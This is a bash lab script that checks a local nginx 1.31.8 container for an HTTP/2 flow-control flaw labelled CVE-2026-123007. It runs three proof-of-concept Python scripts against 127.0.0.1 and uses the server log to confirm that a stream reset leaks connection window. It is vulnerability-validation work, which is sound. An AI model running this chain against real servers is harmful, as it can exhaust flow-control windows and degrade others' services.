#!/usr/bin/env bash
# defex_ngnix.sh - nginx HTTP/2 lab for CVE-2026-123007
#
# Talks to an already running container over HTTP only - no docker calls.
# Start the container yourself, then run this to prove the vulnerability.
#
# Usage: ./defex_ngnix.sh [port]
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NAME="defex-ngnix"
PORT="${1:-18443}"
BASE="https://127.0.0.1:$PORT"
LOG_URL="$BASE/__lab.log"
MAXW=2147483647
PY="$(command -v python3 || true)"
FAILED=0
LOG_OFF=0

say()  { printf '\n\033[1;36m== %s\033[0m\n' "$*"; }
ok()   { printf '\033[1;32m[PASS]\033[0m %s\n' "$*"; }
bad()  { printf '\033[1;31m[FAIL]\033[0m %s\n' "$*"; FAILED=1; }
info() { printf '\033[1;33m[ .. ]\033[0m %s\n' "$*"; }

log_now()  { curl -sk --max-time 5 "$LOG_URL" 2>/dev/null || true; }
log_mark() { LOG_OFF=$(( $(log_now | wc -c) )); }
log_new()  { log_now | tail -c +$((LOG_OFF + 1)); }

say "stage 1/8 preflight"
if [ -z "$PY" ] || ! "$PY" -c 'import ssl,socket' 2>/dev/null; then
    bad "python3 with ssl/socket required"; exit 1
fi
if ! "$PY" -c "import sys;sys.path.insert(0,'$HERE/poc/_vendor');import h2" 2>/dev/null; then
    bad "vendored h2 stack unusable in $HERE/poc/_vendor"; exit 1
fi
ok "python $("$PY" -V 2>&1 | cut -d' ' -f2) with vendored h2"
info "target $BASE - start the container yourself, this script only uses HTTP"

say "stage 2/8 wait for readiness"
UP=0
for i in $(seq 1 40); do
    if curl -sk --max-time 2 "$BASE/" >/dev/null 2>&1; then
        ok "service answering after ${i} attempt(s)"; UP=1; break
    fi
    sleep 0.25
done
if [ "$UP" != 1 ]; then
    bad "nothing answering on $BASE"
    info "start it, e.g.: docker run -d --name $NAME -p 127.0.0.1:$PORT:18443 $NAME:vuln"
    exit 1
fi
if [ "$(log_now | wc -c)" -gt 0 ]; then
    ok "log endpoint reachable, $(log_now | wc -l) line(s) already there"
else
    bad "$LOG_URL empty or missing - image without the log location?"
    exit 1
fi

say "stage 3/8 build facts"
VER=$(curl -skI --max-time 5 "$BASE/" | tr -d '\r' | grep -i '^server:' | grep -o 'nginx/[0-9.]*')
printf '  version: %s\n' "${VER:-none}"
[ "$VER" = "nginx/1.31.8" ] && ok "vulnerable version 1.31.8 confirmed" || bad "unexpected version ${VER:-none}"
PROTO=$(curl -sk --http2 -o /dev/null -w '%{http_version}' --max-time 5 "$BASE/")
[ "$PROTO" = "2" ] && ok "HTTP/2 negotiated (module compiled in)" || bad "expected HTTP/2, got '$PROTO'"

say "stage 4/8 protocol check"
BODY=$(curl -sk --http2 --max-time 20 "$BASE/big.bin" | wc -c)
[ "$BODY" = "4194304" ] && ok "big.bin served, $BODY bytes" || bad "big.bin size $BODY"

say "stage 5/8 PoC A - send window overflows MAX"
log_mark
"$PY" "$HERE/poc/flow_control.py" 1000 127.0.0.1 "$PORT" 2>&1 | sed 's/^/  /'
sleep 1
V=$(log_new | grep -c 'violated connection flow control' || true)
if [ "${V:-0}" -gt 0 ]; then
    ok "server rejected the WINDOW_UPDATE ($V log line(s))"
    log_new | grep -m1 -o 'increment [0-9]* not allowed for window [0-9]*' | sed 's/^/  /'
else
    bad "no violation logged"
fi

say "stage 6/8 PoC B - cleanup does not return the window"
log_mark
"$PY" "$HERE/poc/blocked_frames.py" 400 127.0.0.1 "$PORT" 2>&1 | sed 's/^/  /'
sleep 2
V=$(log_new | grep -c 'violated connection flow control' || true)
printf '  violation lines: %s\n' "${V:-0}"
if [ "${V:-0}" -gt 0 ]; then
    ok "window leaked after stream reset - increment rejected"
    log_new | grep -m1 -o 'increment [0-9]* not allowed for window [0-9]*' | sed 's/^/  /'
else
    bad "no violation after stream reset"
fi
CONN=$(curl -sk --http2 -o /dev/null -w '%{http_version}' --max-time 5 "$BASE/")
[ "$CONN" = "2" ] && ok "server still serves HTTP/2 after the leak" || bad "server unhealthy after leak"

say "stage 7/8 cleanup returns only part of the charged window"
W_RST=0
W_PLAIN=0
for mode in 1 0; do
    log_mark
    "$PY" "$HERE/poc/leak_control.py" 400 "$mode" "$PORT" >/dev/null 2>&1
    sleep 1
    W=$(log_new | grep -o 'not allowed for window [0-9]*' | tail -1 | awk '{print $5}')
    if [ "$mode" = 1 ]; then
        W_RST=${W:-0}
        printf '  with resets   -> window %s\n' "${W:-none}"
    else
        W_PLAIN=${W:-0}
        printf '  without resets -> window %s\n' "${W:-none}"
    fi
done
if [ "$W_RST" -gt 0 ] && [ "$W_PLAIN" -gt 0 ] && [ "$W_RST" -gt "$W_PLAIN" ]; then
    ok "cleanup gives back only unblocked frames - window stays short"
    printf '  ~%s bytes back from cleanup, %s still missing from the window\n' \
        "$((W_RST - W_PLAIN))" "$((MAXW - W_RST))"
else
    bad "cleanup behaviour did not match the leak"
fi

say "stage 8/8 summary"
if [ "$FAILED" = 0 ]; then
    ok "all stages passed - nginx 1.31.8 is vulnerable here"
else
    bad "some stages failed, container left untouched"
fi

say "done"
info "url $BASE/ | log $LOG_URL"
info "shell into it yourself: docker exec -it -w /opt/lab/data $NAME sh"
info "run with -v \$PWD/data:/opt/lab/data to keep shell work across restarts"
